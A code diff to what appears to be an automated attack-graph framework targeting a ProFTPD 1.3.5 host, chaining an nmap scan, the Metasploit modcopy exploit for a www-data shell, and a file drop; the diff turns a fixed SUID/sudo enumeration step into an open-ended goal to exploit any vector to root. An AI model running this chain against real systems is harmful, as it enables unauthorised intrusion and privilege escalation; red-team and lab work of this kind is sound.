@@ -11,10 +11,10 @@ Chain:
   recon            — nmap full scan
   proftpd_check    — auxiliary/scanner/ftp/ftp_version to confirm 1.3.5
   proftpd_rce      — exploit/unix/ftp/proftpd_modcopy_exec -> www-data shell
-  privesc_lookup   — id / sudo -l / find SUID enumeration on the new shell
+  escalate   — id / sudo -l / find SUID enumeration on the new shell
   file_drop        — write proof-of-compromise file (likely as www-data)
 
-Expected: clean run lands a low-privilege shell as www-data. privesc_lookup
+Expected: clean run lands a low-privilege shell as www-data. escalate
 should report no easy root path (no NOPASSWD sudo for www-data), which is
 the correct "honest" signal -- the replanner can decide whether to escalate
 or wrap up with file_drop in a www-writable directory.
@@ -114,26 +114,20 @@ def build_proftpd_modcopy_graph(target_ip: str, attacker_ip: str) -> AttackGraph
     ))
 
     graph.add_node(AttackNode(
-        id="privesc_lookup",
-        label="Enumerate Privesc Vectors from Shell",
+        id="escalate",
+        label="Escalate Privileges to Root",
         tactic=Tactic.PRIVILEGE_ESCALATION.value,
-        technique_id="T1082",
-        technique_name="System Information Discovery",
+        technique_id="T1068",
+        technique_name="Exploitation for Privilege Escalation",
         agent_type="privesc",
-        goal="Identify whether the www-data shell can reach root",
-        objective="Enumerate id, sudo, SUID binaries, and writable system paths "
-                  "from the newly opened session.",
+        goal="Escalate the compromised session to root",
+        objective="From the existing session, enumerate AND exploit any viable "
+                  "privilege-escalation vector (sudo, SUID, kernel exploit, cron, "
+                  "capabilities, writable config, docker group) to obtain a root "
+                  "shell. Verify success with id/whoami showing uid=0.",
         target_ip=target_ip,
-        tool_name="session",
-        commands_to_run=[
-            "id",
-            "whoami",
-            "uname -a",
-            "sudo -n -l",
-            "find / -perm -4000 -type f 2>/dev/null | head -20",
-        ],
-        max_retries=1,
-        tags=["privesc", "enum", "suid"],
+        max_retries=3,
+        tags=["privesc", "escalation", "goal_only"],
     ))
 
     graph.add_node(AttackNode(
@@ -195,7 +189,7 @@ def build_proftpd_modcopy_graph(target_ip: str, attacker_ip: str) -> AttackGraph
     )
 
     graph.connect(
-        "proftpd_rce", "privesc_lookup",
+        "proftpd_rce", "escalate",
         checks=[
             EdgeCheck(
                 field="session_id", operator="exists",
@@ -207,7 +201,7 @@ def build_proftpd_modcopy_graph(target_ip: str, attacker_ip: str) -> AttackGraph
     )
 
     graph.connect(
-        "privesc_lookup", "file_drop",
+        "escalate", "file_drop",
         checks=[
             EdgeCheck(
                 field="success", operator="equals", expected="True",
